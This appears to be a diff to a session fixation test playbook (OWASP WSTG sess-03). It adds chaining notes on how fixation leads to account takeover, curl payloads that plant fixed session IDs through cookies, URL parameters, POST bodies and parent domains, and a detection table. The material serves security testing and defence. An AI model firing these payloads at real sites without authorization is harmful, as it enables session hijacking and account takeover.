@@ -8,9 +8,11 @@ author: cyberstrike-official
 tags: [session, cookies, csrf, token, wstg, sess]
 tech_stack: []
 cwe_ids: [CWE-613]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-sess-06, wstg-sess-01]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-sess-06: "Session fixation + broken logout invalidation = attacker's pre-set session stays valid even after the victim logs out, giving persistent unauthorized access (Critical)"
+  wstg-sess-01: "Confirmed fixation + a schema that accepts externally-supplied/predictable IDs = mass account takeover with no MITM or XSS required (Critical)"
 ---
 
 # wstg-sess-03
@@ -293,6 +295,35 @@ tester.test_url_session()
 | **Burp Suite**       | Session analysis  | Compare pre/post auth sessions |
 | **OWASP ZAP**        | Automated testing | Session fixation scanner       |
 | **Browser DevTools** | Cookie monitoring | Observe session changes        |
+
+---
+
+## Example Commands/Payloads
+
+```bash
+# Classic fixation PoC: attacker sets ID before victim logs in
+ATTACKER_ID="FIXED-SESSION-0001"
+curl -s -c - -b "SESSIONID=$ATTACKER_ID" "https://{target}/login" \
+  -d "user=victim&pass=victimpass" | grep SESSIONID
+# [VULN] if response Set-Cookie still shows SESSIONID=FIXED-SESSION-0001
+
+# Does the app accept a session ID injected via URL/query string?
+curl -s -I "https://{target}/;jsessionid=FIXED-SESSION-0002"
+curl -s -I "https://{target}/?PHPSESSID=FIXED-SESSION-0002"
+
+# Does the app accept a session ID injected via POST body?
+curl -s -c - "https://{target}/login" -d "SESSIONID=FIXED-SESSION-0003&user=test&pass=test"
+
+# Cross-subdomain fixation: set on parent domain, check if sub-app honors it
+curl -s -c - -b "SESSIONID=FIXED-SESSION-0004; Domain=.{target}" "https://sub.{target}/login"
+```
+
+| Detection Pattern | Meaning |
+| --- | --- |
+| Pre-auth and post-auth `SESSIONID` values are identical | [VULN] No regeneration on login — classic fixation |
+| Server accepts `jsessionid`/`PHPSESSID` from URL path/query | [VULN] Session adoption via URL |
+| Server accepts session ID supplied in POST body before auth | [VULN] Session adoption via body |
+| New random ID issued immediately after successful login | [OK] Fixation mitigated |
 
 ---
 
